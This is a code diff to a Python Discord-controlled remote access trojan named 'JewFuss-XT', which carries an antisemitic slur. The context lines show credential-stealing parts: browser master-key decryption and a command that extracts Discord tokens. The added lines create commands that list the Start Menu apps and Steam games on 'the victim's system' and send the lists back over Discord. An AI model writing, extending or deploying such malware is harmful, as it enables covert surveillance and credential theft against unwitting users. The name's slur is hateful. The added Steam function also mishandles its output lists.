@@ -5,6 +5,7 @@ from PIL import Image, ImageDraw
 from comtypes import CLSCTX_ALL
 from threading import Thread
 from pynput import keyboard
+import win32com.client
 import subprocess
 import webbrowser
 import win32crypt
@@ -26,6 +27,7 @@ import base64
 import ctypes
 import psutil
 import shutil
+import glob
 import json
 import time
 import uuid
@@ -33,13 +35,14 @@ import wave
 import cv2
 import mss
 import sys
+import vdf
 import wmi
 import io
 import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.3" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -48,6 +51,16 @@ intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='$', intents=intents)
 bot.remove_command('help')
 pyautogui.FAILSAFE = False
+
+async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt"):
+    if len(content) > 2000:
+        if alt_content is not None:
+            await ctx.send(content=alt_content)
+        else:
+            buffer = io.BytesIO(content.encode("utf-8"))
+            await ctx.send(file=discord.File(fp=buffer, filename=filename))
+    else:
+        await ctx.send(content)
 
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
 async def update(ctx):
@@ -756,6 +769,86 @@ def get_master_key(local_state_path):
         local_state = json.load(f)
     encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
     return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+@bot.command(help="Lists valid Start Menu shortcuts on the victim's system.")
+async def liststartapps(ctx):
+
+    start_menu_paths = [
+        os.path.join(os.getenv("ProgramData"), r"Microsoft\Windows\Start Menu\Programs"),
+        os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs")
+    ]
+
+    shell = win32com.client.Dispatch("WScript.Shell")
+    exclude_keywords = {"eula", "documentation", "faq"}
+    apps = []
+    appsunsf = []
+
+    for base_path in start_menu_paths:
+        for root, _, files in os.walk(base_path):
+            for file in files:
+                if not file.lower().endswith(".lnk"):
+                    continue
+
+                full_path = os.path.join(root, file)
+                name = os.path.splitext(file)[0]
+
+                if any(excluded in name.lower() for excluded in exclude_keywords):
+                    continue
+
+                try:
+                    shortcut = shell.CreateShortcut(full_path)
+                    target = shortcut.TargetPath
+                    if not target or not os.path.exists(target):
+                        continue
+                except:
+                    continue
+
+                apps.append(f"> **{name}** `{full_path}`")
+                appsunsf.append(f"{name} - {full_path}")
+                
+    output = "\n".join(sorted(apps)) or "No valid shortcuts found."
+    outputunsf = "\n".join(sorted(appsunsf)) or "No valid shortcuts found."
+    await fm_send(ctx, output, outputunsf, "startmenu.txt", )
+
+@bot.command(help="Lists installed Steam games with paths.")
+async def liststeamapps(ctx):
+    steam_path = os.path.expandvars(r"%PROGRAMFILES(X86)%\Steam")
+    library_vdf_path = os.path.join(steam_path, "steamapps", "libraryfolders.vdf")
+
+    if not os.path.exists(library_vdf_path):
+        await ctx.send("Could not locate Steam or `libraryfolders.vdf`.")
+        return
+
+    with open(library_vdf_path, 'r', encoding='utf-8') as f:
+        data = vdf.load(f)
+
+    libraries = []
+    for key in data.get('libraryfolders', {}):
+        if key.isdigit():
+            path = data['libraryfolders'][key].get('path', '')
+            if path and os.path.isdir(path):
+                libraries.append(path)
+
+    games = []
+    gamesunf = []
+    for lib in libraries:
+        steamapps_path = os.path.join(lib, "steamapps")
+        for manifest_path in glob.glob(os.path.join(steamapps_path, "appmanifest_*.acf")):
+            try:
+                with open(manifest_path, 'r', encoding='utf-8') as f:
+                    manifest = vdf.load(f)
+                app_state = manifest.get('AppState', {})
+                name = app_state.get('name', 'Unknown')
+                install_dir = app_state.get('installdir', 'Unknown')
+                full_path = os.path.join(steamapps_path, "common", install_dir)
+                games.append(f'> **{name}** ``{full_path}``')
+                games.append(f'{name} - {full_path}')
+            except Exception as e:
+                print(f"Failed to parse {manifest_path}: {e}")
+
+    output = "\n".join(games) or "No steam games found."
+    outputunsf = "\n".join(gamesunf) or "No steam games found."
+    await fm_send(ctx, output, outputunsf, "output.txt")
 
 @bot.command(help="Gets discord tokens from Google Chrome, Opera (GX), Brave & Yandex")
 async def getdiscord(ctx, max_force_profiles: int = 10):
